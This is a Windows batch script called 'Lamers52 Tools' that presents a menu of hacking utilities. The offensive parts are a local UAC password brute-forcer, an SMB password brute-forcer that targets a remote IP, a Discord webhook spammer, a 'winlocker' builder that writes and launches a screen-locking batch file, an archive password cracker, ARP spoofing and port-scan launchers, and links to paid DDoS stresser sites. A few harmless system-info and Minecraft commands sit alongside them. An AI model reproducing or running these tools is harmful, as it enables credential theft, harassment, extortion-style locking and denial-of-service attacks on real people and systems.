@echo off
chcp 65001 > nul
title Lamers52 Tools
color 0a
:menu
color 0a
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo ver. 1.0.2 (NOT FOR PUBLIC USE)
echo ┌─────────────────────────────────────┐
echo │                Tools             [X]│
echo ├─────────────────────────────────────┤
echo │ ╔1. Exit                            │
echo │ ╬2. UAC-Brute                       │
echo │ ╬3. IP Ping                         │
echo │ ╬4. Geo LookUp                      │
echo │ ╬5. SMB Bruter                      │
echo │ ╬6. Discord Webhook Spammer         │
echo │ ╬7. Create Winlocker                │
echo │ ╬8. System Info                     │
echo │ ╬9. WinRar Cracker                  │
echo │ ╬10. Task list                      │
echo │ ╬11. Check Disk                     │
echo │ ╬12. Gpresults                      │
echo │ ╬13. Netstat                        │
echo │ ╬14. IP Config                      │
echo │ ╬15. Date and Time                  │
echo │ ╬16. Install Minecraft              │
echo │ ╬17. Run Minecraft                  │
echo │ ╬18. Colours                        │
echo │ ╬19. RPC Dump                       │
echo │ ╬20. Mac-Address                    │
echo │ ╬21. ARPSpoof                       │
echo │ ╬22. DDOS                           │
echo │ ╬23. Port Scan                      │
echo │ ╚24. Trace DNS                      │
echo └─────────────────────────────────────┘
set /p choice=Enter your choice: 

if "%choice%"=="1" goto :eof
if "%choice%"=="2" goto uacbrute
if "%choice%"=="3" goto ping
if "%choice%"=="4" goto ip_geo_lookup
if "%choice%"=="5" goto smbbruter
if "%choice%"=="6" goto messagesender
if "%choice%"=="7" goto winlocker
if "%choice%"=="8" goto systeminfo
if "%choice%"=="9" goto winrar
if "%choice%"=="10" goto tasklist
if "%choice%"=="11" goto checkdisk
if "%choice%"=="12" goto gpresults
if "%choice%"=="13" goto netstat
if "%choice%"=="14" goto ipconfig
if "%choice%"=="15" goto time
if "%choice%"=="16" goto minecraft
if "%choice%"=="17" goto runmc
if "%choice%"=="18" goto colours
if "%choice%"=="19" goto rpcdump
if "%choice%"=="20" goto Macaddr
if "%choice%"=="21" goto arpspoof
if "%choice%"=="22" goto ddos
if "%choice%"=="23" goto portscan
if "%choice%"=="24" tracedns
goto menu

:ping
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ 
set /p ip="IP-Adress: "
if "%ip%"=="" (
    echo You have not entered an IP address. Please try again.
    goto ping
)
echo Pinging %ip%...
ping %ip% -n 10
echo.
pause
goto menu

:ip_geo_lookup
cls
echo ███████╗███╗   ██╗████████╗███████╗██████╗     ██╗██████╗ 
echo ██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗    ██║██╔══██╗
echo █████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝    ██║██████╔╝
echo ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗    ██║██╔═══╝ 
echo ███████╗██║ ╚████║   ██║   ███████╗██║  ██║    ██║██║     
echo ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝╚═╝
echo. ================================================
echo Enter An IP address to lookup (or type back to return to the main menu):
set /p ip=
if "%ip%"=="back" goto menu

curl "https://ipinfo.io/%ip%/json" -o geolocation.json
echo ==================================
echo IP Geolocation for &`%ip%:
type geolocation.json
del gelocation.json
echo =================================
pause
goto ip_geo_lookup

:uacbrute
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ 
set error=-
set user=""
set wordlist=""
set /a count=1
echo.
echo.
echo [TARGET USER]
set /p user=">> "
echo.
echo [PASSWORD LIST]
set /p wordlist=">> "
if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto menu
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo [91m[%error%][0m [97mUser doesn't exist[0m
  pause >nul
  goto menu
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
  set pass=%%a
  call :varset
)
echo.
echo [91m[%error%][0m [97mPassword not found[0m
pause >nul
goto menu

:successuac
echo.
echo [92m[+][0m [97mPassword found: %pass%[0m
net use \\127.0.0.1 /d /y >nul 2>&1
set user=
set pass=
echo.
pause >nul
goto menu

:varset
net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if /I "%errorlevel%" EQU "0" goto successuac
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto successuac 

:smbbruter
cls
echo ███████╗███╗   ██╗████████╗███████╗██████╗     ██╗██████╗ 
echo ██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗    ██║██╔══██╗
echo █████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝    ██║██████╔╝
echo ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗    ██║██╔═══╝ 
echo ███████╗██║ ╚████║   ██║   ███████╗██║  ██║    ██║██║     
echo ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝╚═╝
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ 
echo.
set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
goto menu

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto menu

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

:messagesender
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ 
echo ┌────────────────────────────────┐
echo │     Discord webhook spammer    │
echo ├────────────────────────────────┤
set /p "webhook=│ Enter Discord webhook URL for Message Sender: "
set /p "message=│ Enter the message to send: "
set /p "num_times=│ Enter the number of times to send the message: "

for /l %%n in (1,1,%num_times%) do (
    :: Send message to Discord webhook
    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%message%\"}" %webhook%
)
echo Messages sent successfully.
pause
goto menu

:winlocker
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
set /p password=Please enter a password (or enter "back" to return to the menu):
if /I "%password%" == "back" (
goto menu
) else (
set "password=%password:"=%"
echo @echo off > "%~dp0unlock.bat"
echo set "password=%password%" >> "%~dp0unlock.bat"
echo title winloker >> "%~dp0unlock.bat"
echo color 04 >> "%~dp0unlock.bat"
echo :unlock >> "%~dp0unlock.bat"
echo cls >> "%~dp0unlock.bat"
echo echo Your computer is locked >> "%~dp0unlock.bat"
echo echo. >> "%~dp0unlock.bat"
echo set /p unlock=<nul & set /p "=Please write the key to unlock: "
set /p unlock=>> "%~dp0unlock.bat"
echo if /I "%unlock%" == "%password%" ( >> "%~dp0unlock.bat"
echo start explorer.exe >> "%~dp0unlock.bat"
echo exit >> "%~dp0unlock.bat"
echo ) else ( >> "%~dp0unlock.bat"
echo goto unlock >> "%~dp0unlock.bat"
echo ) >> "%~dp0unlock.bat"
echo Unlock.bat file has been created with the password: %password%
start cmd /c "%~dp0unlock.bat"
pause
goto menu
)

:systeminfo
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
systeminfo
pause
goto menu

:winrar
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
if not exist "C:\Program Files\7-Zip" (
	echo 7-Zip not installed!
	pause
	goto menu
)

echo.
set /p archive="Enter Archive: "
if not exist "%archive%" (
	echo Archive not found!
	pause
	goto menu
)

set /p wordlist="Enter Wordlist: "
if not exist "%wordlist%" (
	echo Wordlist not found!
	pause
	goto menu
)
echo Cracking...
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attemptt
)
echo shitty wordlist dumbass
pause
goto menu

:attemptt
"C:\Program Files\7-Zip\7z.exe" x -p%pass% "%archive%" -o"cracked" -y >nul 2>&1
echo ATTEMPT : %pass%
if /I %errorlevel% EQU 0 (
	echo Success! Password Found: %pass%
	pause
	exit
)

:tasklist
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
tasklist
pause >nul
goto menu

:checkdisk
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
chkdsk
pause >nul
goto menu

:gpresults
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
gpresult /z
pause >nul

:netstat
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo Please wait...
netstat -a                         
netstat -e                           
netstat -n                           
netstat -o                           
netstat -p                           
netstat -s
netstat -r
pause > nul
goto menu

:ipconfig
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
ipconfig /all
pause > nul
goto menu

:time
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo Date : %date%
echo Day : %date:~0,2%
echo Month : %date:~3,2%
echo Year : %date:~6,4%
pause >nul
goto menu

:minecraft
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo Minecraft Launcher made by Reactive Slime!
echo.
echo After installing game
mkdir data
mkdir bin
echo Downloading Minecraft.exe
curl -o bin\minecraft.exe "https://launcher.mojang.com/download/Minecraft.exe" -L
cls
echo Downloading run.bat
curl -o run.bat "https://raw.githubusercontent.com/ReactiveSlime/batch-minecraft-launcher/master/run.bat" -L
(
echo set username1=admin
echo set password1=password
)>"admin.bat"
attrib +H +S "admin.bat"
run.bat
echo Now you can open run.bat
pause > nul
goto menu

:runmc
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
Pushd "%~dp0"
    run.bat
    popd
    exit /B
    
:colours
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo.
echo Bold
echo.
echo [1;90mGrey[0m
echo [1;91mRed[0m
echo [1;92mGreen[0m
echo [93mYellow[0m
echo [94mBlue[0m
echo [95mMagenta[0m
echo [96mCyan[0m
echo [97mWhite[0m
echo.
echo Normal
echo.
echo [90mGrey[0m
echo [91mRed[0m
echo [92mGreen[0m
echo [93mYellow[0m
echo [94mBlue[0m
echo [95mMagenta[0m
echo [96mCyan[0m
echo [97mWhite[0m
echo [4mUnderlined[0m
echo [7mHighlighted[0m
echo [30mBlack[0m
echo [31mDark Red[0m
echo [32mDark Green[0m
echo [33mDark Yellow[0m
echo [34mDark Blue[0m
echo [35mDark Purple[0m
echo [36mDark Cyan[0m
echo.
echo [41mRed Highlight[0m
echo [42mGreen Highlight[0m
echo [43mYellow Highlight[0m
echo [44mBlue Highlight[0m
echo [45mPurple Highlight[0m
echo [46mCyan Highlight[0m
echo [47mCensor[0m
echo.
:end
pause
goto menu

:rpcdump
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo.
set /p ip=Enter IP Address: 
rpcdump %ip%
echo.
pause
cls
goto menu

:Macaddr
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo.
set /p ip=Enter IP Address: 
ping -w 1 %ip% >nul
for /f "tokens=2 delims= " %%a in ('arp -a ^| find "%ip%"') do set macaddr=%%a
for /f "usebackq delims=" %%I in (`powershell "\"%macaddr%\".toUpper()"`) do set "upper=%%~I"
cls
echo.
echo Mac Address: %upper%
echo.
pause
cls
goto menu

:arpspoof
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo.
set errorlevel=0
set /p ip=Enter IP Address: 
start cmd /c "mode 87, 10 && title Spoofing %ip%... && echo. && arpspoof.exe %ip%"
goto menu

:ddos
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo.
echo 1) https://freestresser.so/
echo 2) https://hardstresser.com/
echo 3) https://stresser.net/
echo 4) https://str3ssed.co/
echo 5) https://projectdeltastress.com/
echo 6) Back
echo.
set /p ddosinput=
if /I "%ddosinput%" EQU "1" start https://freestresser.so/
if /I "%ddosinput%" EQU "2" start https://hardstresser.com/
if /I "%ddosinput%" EQU "3" start https://stresser.net/
if /I "%ddosinput%" EQU "4" start https://str3ssed.co/
if /I "%ddosinput%" EQU "5" start https://projectdeltastress.com/
if /I "%ddosinput%" EQU "6" goto menu
goto menu

:portscan
cls
set errorlevel=0
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo.
set /p ip=IP Address: 
set /p ports=Ports (e.g. 21,22,23): 
start cmd /c "mode 40, 15 && title Scanning Ports... && PortScanner.exe hosts=%ip% ports=%ports%>>portscan.txt"
ping localhost -n 5 >nul
taskkill /im PortScanner.exe /f >nul 2>&1
echo.
type portscan.txt
echo.
ping localhost -n 1 >nul
del portscan.txt
pause
goto menu

:tracedns
cls
echo ██╗      █████╗ ███╗   ███╗███████╗██████╗ ███████╗███████╗██████╗ 
echo ██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝██╔════╝╚════██╗
echo ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████╗███████╗ █████╔╝
echo ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗╚════██║╚════██║██╔═══╝ 
echo ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║███████║███████║███████╗
echo ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
echo.
set /p ip=IP Address: 
cls
for /f "tokens=2 delims= " %%a in ('nslookup %ip% ^| find "Name"') do set dns=%%a
echo.
echo Domain Name: %dns%
echo.
pause
goto menu

